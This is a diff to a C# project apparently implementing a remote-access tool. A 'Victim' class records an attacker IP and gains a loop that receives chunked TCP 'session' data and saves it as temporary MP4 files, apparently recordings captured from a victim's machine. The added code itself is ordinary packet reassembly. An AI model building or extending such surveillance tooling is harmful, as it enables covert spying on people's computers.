@@ -50,6 +50,14 @@ namespace ExtremLink_Client_v2.Classes
             get { return this.attackerIpAddr; }
         }
 
+
+        // A byte array object which contains the temp session content
+        private byte[] currentSessionBytes;
+        public byte[] CurrentSessionBytes
+        {
+            get { return this.currentSessionBytes; }
+        }
+
         // Singelton behavior:
         private static Victim victimInstance = null;
         public static Victim VictimInstance
@@ -85,6 +93,7 @@ namespace ExtremLink_Client_v2.Classes
             // The function starts the tasks of the functions which handling with packets.
             Task.Run(() => this.HandleUdpCommunication());
             Task.Run(() => this.HandleTcpCommunication());
+            Task.Run(() => this.HandleSessionsTcpCommunication());
         }
 
 
@@ -216,11 +225,24 @@ namespace ExtremLink_Client_v2.Classes
             // Output: The function handles with different types of messages over the udp socket.
             // & - Frames handling.
         }
-        
-        
+
+        // Sessions Tcp handler function:
+        private async Task HandleSessionsTcpCommunication()
+        {
+            // Input: Nothing.
+            // Output: The function handles with the sockets content packets
+            while (true)
+            {
+                this.currentSessionBytes = this.GetSession();
+                Session.CreateTempMP4File(this.currentSessionBytes);
+                Thread.Sleep(1000);
+            }
+        }
+
+
         // Sub-Handlers:
 
-            // Handle general stuff messages:
+        // Handle general stuff messages:
         private void HandleGeneralStuffMessages(string data)
         {
             // Input: A string which represent a given general stuff message from the server.
@@ -347,7 +369,59 @@ namespace ExtremLink_Client_v2.Classes
                     break;
             }
         }
+        private byte[] GetSession()
+        {
+            // Input: Nothing.
+            // Output: The function receives a session content and returns it as a byte array.
+            Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
+            int streamId = -1;
+            int totalPackets = -1;
 
+            // Receive packets
+            while (receivedPackets.Count < totalPackets || totalPackets == -1)
+            {
+                // Buffer size for each packet
+                byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+
+                int bytesRead = this.sessionTcpSocket.Receive(buffer);
+
+                // MessageBox.Show("A udp pakcet was received by the server from the victim");
+                // Extract metadata
+                int receivedStreamId = BitConverter.ToInt32(buffer, 0);
+                int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
+                int packetIndex = BitConverter.ToInt32(buffer, 8);
+
+                // Ensure packets are part of the same stream
+                if (streamId == -1) streamId = receivedStreamId;
+                if (totalPackets == -1) totalPackets = receivedTotalPackets;
+                if (streamId != receivedStreamId) continue;
+
+                // Extract segment data
+                byte[] segmentData = new byte[bytesRead - 12];
+                Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
+
+                // Store segment if not already received
+                if (!receivedPackets.ContainsKey(packetIndex))
+                {
+                    receivedPackets[packetIndex] = segmentData;
+                }
+            }
+            using (var ms = new MemoryStream())
+            {
+                for (int i = 0; i < totalPackets; i++)
+                {
+                    if (receivedPackets.TryGetValue(i, out var segment))
+                    {
+                        ms.Write(segment, 0, segment.Length);
+                    }
+                    else
+                    {
+                        throw new Exception($"Missing packet {i}");
+                    }
+                }
+                return ms.ToArray();
+            }
+        }
 
         // Init server respond string
         public void InitServerRespond()
